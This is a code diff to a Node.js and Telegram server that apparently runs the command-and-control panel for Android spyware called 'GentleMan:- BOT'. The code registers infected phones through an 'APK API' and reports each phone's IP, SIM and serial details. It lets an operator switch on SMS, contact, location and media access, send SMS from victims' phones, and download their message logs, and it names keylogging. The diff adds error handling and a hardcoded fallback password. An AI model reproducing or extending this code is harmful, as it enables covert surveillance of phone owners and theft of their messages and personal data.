@@ -4,6 +4,12 @@ const fs = require('fs');
 const express = require('express');
 const moment = require('moment-timezone');
 
+// Validate env vars
+if (!process.env.BOT_API || !process.env.USER_ID) {
+  console.error('Missing BOT_API or USER_ID in .env');
+  process.exit(1);
+}
+
 const bot = new Telegraf(process.env.BOT_API);
 const app = express();
 app.use(express.json());
@@ -15,12 +21,24 @@ const NP_DATE = () => moment().tz('Asia/Kathmandu').format('YYYY-MM-DD');
 // Data Storage
 let bots = {};
 const DATA_FILE = 'bots.json';
-if (fs.existsSync(DATA_FILE)) bots = JSON.parse(fs.readFileSync(DATA_FILE));
-function save() { fs.writeFileSync(DATA_FILE, JSON.stringify(bots, null, 2)); }
+if (fs.existsSync(DATA_FILE)) {
+  try {
+    bots = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+  } catch (err) {
+    console.error('Error loading bots.json:', err);
+  }
+}
+function save() {
+  try {
+    fs.writeFileSync(DATA_FILE, JSON.stringify(bots, null, 2));
+  } catch (err) {
+    console.error('Error saving bots.json:', err);
+  }
+}
 
 // Auth
 const ADMIN_ID = parseInt(process.env.USER_ID);
-const PASSWORD = process.env.Password;
+const PASSWORD = process.env.Password || 'GentleMan'; // Fallback
 let loggedIn = false;
 
 function isAdmin(ctx) {
@@ -34,10 +52,7 @@ function queueCmd(id, cmd) {
   save();
 }
 
-
-// GentleMan:- BOT Command's !
-
-
+// BOT COMMANDS
 bot.start(ctx => {
   if (ctx.from.id !== ADMIN_ID) return;
   ctx.reply(`*GentleMan:- BOT* | Nepal Control\n\nPlease Enter The Password !\n\nTime: ${NP_TIME()} (+05:45)`, { parse_mode: 'Markdown' });
@@ -86,7 +101,7 @@ bot.command('help', ctx => {
 > *Time:* ${NP_TIME()} (+05:45) | *Date:* ${NP_DATE()}`, { parse_mode: 'Markdown' });
 });
 
-// --- INFO COMMANDS ---
+// INFO COMMANDS
 bot.command('total bot info', ctx => { if (!isAdmin(ctx)) return; ctx.reply(`BOT'S: ${Object.keys(bots).length}`); });
 bot.command('online bot info', ctx => { if (!isAdmin(ctx)) return; ctx.reply(`BOT'S: ${Object.values(bots).filter(b => b.online).length}`); });
 bot.command('offline bot info', ctx => { if (!isAdmin(ctx)) return; ctx.reply(`BOT'S: ${Object.values(bots).filter(b => !b.online).length}`); });
@@ -115,7 +130,7 @@ bot.command('device info', ctx => {
   ctx.reply(`${status}\n[${id}]\nIP: ${b.ip||'0.0.0.0'}\nReal Time: ${NP_TIME()}\nName: ${b.device||'--'}\nAndroid: ${b.android||'--'}\nBattery: ${b.battery||'--'}%\nSIM1: ${b.sim1||'--'}\nSIM2: ${b.sim2||'--'}\nSerial: ${b.serial||'--'}`);
 });
 
-// --- PERMISSIONS ---
+// PERMISSIONS
 ['background','sms','contact','location','media'].forEach(p => {
   bot.command(p, ctx => {
     if (!isAdmin(ctx)) return;
@@ -128,7 +143,7 @@ bot.command('device info', ctx => {
   });
 });
 
-// --- SMS & KEYLOG & MEDIA ---
+// SMS & KEYLOG & MEDIA
 bot.command('send sms', ctx => {
   if (!isAdmin(ctx)) return;
   const parts = ctx.message.text.split(' ');
@@ -152,11 +167,12 @@ bot.command('sms.txt', ctx => {
   ctx.replyWithDocument({ source: Buffer.from(txt), filename: `${sim}_${id}_sms.txt` });
 });
 
-// --- APK API ---
+// APK API
 app.post('/register', (req, res) => {
   const { id, ...info } = req.body;
   bots[id] = { ...bots[id], ...info, online: true, lastSeen: Date.now() };
   save();
+  console.log(`Registered bot: ${id}`);
   res.send('OK');
 });
 
@@ -172,12 +188,12 @@ app.post('/report/:id', (req, res) => {
   const id = req.params.id;
   Object.assign(bots[id], req.body);
   save();
+  console.log(`Report from ${id}:`, req.body);
   res.send('OK');
 });
 
-// === START ===
+// START
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on :${PORT}`));
-bot.launch();
-
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+bot.launch().then(() => console.log('Telegram BOT live'));
 console.log(`GentleMan:- BOT v1.0.0 | Nepal | ${NP_TIME()}`);
